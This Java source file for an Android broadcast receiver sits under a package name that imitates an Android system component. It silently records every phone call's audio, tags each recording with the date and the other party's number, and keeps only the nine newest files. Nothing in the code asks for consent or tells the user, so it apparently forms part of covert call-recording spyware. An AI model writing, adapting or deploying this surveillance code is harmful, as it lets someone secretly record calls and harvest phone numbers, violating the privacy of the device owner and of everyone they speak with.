package com.android.system.receiver;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;

import com.android.system.utils.AudioRecorder;
import com.android.system.utils.SystemUtil;

import java.io.File;
import java.util.Arrays;

public class PhoneCallReceiver extends BroadcastReceiver {
    private static String sPhoneNumber = null;

    @Override
    public void onReceive(final Context context, final Intent intent) {
        String phoneNumber = null;
        if(intent.getAction().equalsIgnoreCase(Intent.ACTION_NEW_OUTGOING_CALL)) {
            phoneNumber = getOutGoingCallNumber(intent);
        } else {
            phoneNumber = intent.getStringExtra("incoming_number");
        }
        if(phoneNumber != null) {
            sPhoneNumber = phoneNumber;
        }

        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
        int state = telephonyManager.getCallState();
        switch(state){
            case TelephonyManager.CALL_STATE_IDLE:
                AudioRecorder.stop();
                break;
            case TelephonyManager.CALL_STATE_OFFHOOK:
                String recordPath = context.getFilesDir().getAbsolutePath() + "/record/";
                File recordDir = new File(recordPath);
                recordDir.mkdirs();

                //remove old record file
                File [] fileList = recordDir.listFiles();
                int maxFileCount = 9;
                if(fileList != null && fileList.length > maxFileCount) {
                    Arrays.sort(fileList);
                    int n = fileList.length - maxFileCount;
                    for(int i=0; i<n;++i) {
                        fileList[i].delete();
                    }
                }

                String savePath = recordPath + SystemUtil.getDateString() + "-" + (sPhoneNumber) + ".amr";
                AudioRecorder.start(savePath);
                break;
            case TelephonyManager.CALL_STATE_RINGING:
                break;
        }
    }

    private String getOutGoingCallNumber(Intent intent)
    {
        String number = "";
        if (null != intent)
        {
            Bundle tmpBundle = intent.getExtras();
            if (null != tmpBundle ) {
                number = getResultData();
                if ((number != null) && (number.trim().length() > 0)) {
                    return number;
                }

                number = tmpBundle.getString(Intent.EXTRA_PHONE_NUMBER);
                if ((number != null) && (number.trim().length() > 0)) {
                    return number;
                }
                number = tmpBundle.getString("number");
                if ((number != null) && (number.trim().length() > 0)) {
                    return number;
                }

                number = tmpBundle.getString("android.phone.extra.ORIGINAL_URI");
                if (number != null) {
                    try {
                        number = number.trim();
                        if ((null != number) && (4 < number.length() && (number.substring(0, 4).equalsIgnoreCase("tel:")))) {
                            return number.substring(4);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
        return number;
    }
}
